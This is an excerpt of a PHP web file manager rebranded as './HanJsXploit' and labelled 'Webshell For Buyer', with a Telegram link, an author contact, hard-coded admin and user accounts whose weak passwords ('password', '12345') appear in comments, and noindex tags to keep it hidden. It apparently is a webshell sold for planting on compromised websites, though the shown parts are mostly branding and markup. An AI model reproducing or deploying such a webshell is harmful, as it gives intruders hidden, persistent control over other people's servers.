...
//Application Title
define('APP_TITLE', 'Webshell For Buyer');
...
$auth_users = array(
    'admin' => '$2y$10$a3TxcH1ZJeWcDYp/tm9RKOReTP9UvFTuZBh/fZ1uULCyxY.wc4abq', //password
    'user' => '$2y$10$gpOOEoLeI3.pity8fvbiFuiO9IRFA0lyaK995vnjkypqU7525yP5G' //12345
);
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://t.me/biskuat13" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">Webshell For Buyer</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://t.me/biskuat13" target="_blank" class="app-v-title"> ./HanJsXploit <?php echo VERSION; ?></a></h3></p>
                        <p>Author: sandi</p>
                        <p>Mail Us: <a href="mailto:sanz404@proton.me">sanz404[at]proton.me</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://t.me/biskuat13" target="_blank" class="float-right text-muted">./HanJsXploit <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://t.me/biskuat13" target="_blank" class="float-right text-muted">./HanJsXploit <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = './HanJsXploit <br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<center><meta charset="utf-8">
    ...
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Han">
    <meta name="author" content="./HanJsXploit project">
...
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with ./HanJsXploity">
    <meta name="author" content="./HanJsXploit project">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = './HanJsXploit';      $tr['en']['AppTitle']           = '';
